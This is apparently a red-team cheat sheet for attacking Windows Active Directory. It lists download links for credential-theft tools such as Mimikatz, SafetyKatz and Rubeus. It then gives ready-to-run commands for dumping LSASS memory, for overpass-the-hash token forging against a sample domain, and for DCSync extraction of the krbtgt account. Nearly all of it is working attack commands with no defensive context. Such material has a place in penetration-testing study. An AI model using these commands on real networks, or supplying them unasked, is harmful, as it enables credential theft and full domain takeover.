**Invoke-Mimikatz:** https://github.com/PowerShellMafia/PowerSploit/tree/master/Exfiltration
**SafetyKatz.exe:** https://github.com/Nuvare/AD-Tools/tree/main
**SharpKatz.exe:** https://github.com/jakobfriedl/precompiled-binaries/tree/main/Credentials
**Pypykatz.exe:** https://github.com/maxamin/AD-Mastertools-collection/tree/main
**Rubeus.exe:** https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/tree/master

**Extracting Credentials from LSASS:**
```powershell
# Using Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Using SafetyKatz
	SafetyKatz.exe "sekurlsa::ekeys"
# Using SharpKatz
	SharpKatz.exe -Command ekeys
# Using Dumpert
	rundll32.exe C:\Dumpert\Outflank-Dumpert.dss, Dump
# Using pypykatz
	pypykatz.exe live lsa
# Using comsvcs.dll
	tasklist /FI "IMAGENAME eq lsass.exe"
	rundll32.exe C:\Windows\System32\comsvcs.dll , MiniDump "lsass ID" C:\lsass.dump full
```

**OverPass-The-Hash:**
	**OPTH generate tokens from hashes or keys(Run as Administrator):**
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:stark.local /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:stark.local
/aes256<aes256key> /run:cmd.exe" "exit"

Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt (Don't needs Admin priv)

Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**DCSync:**
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt'"
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
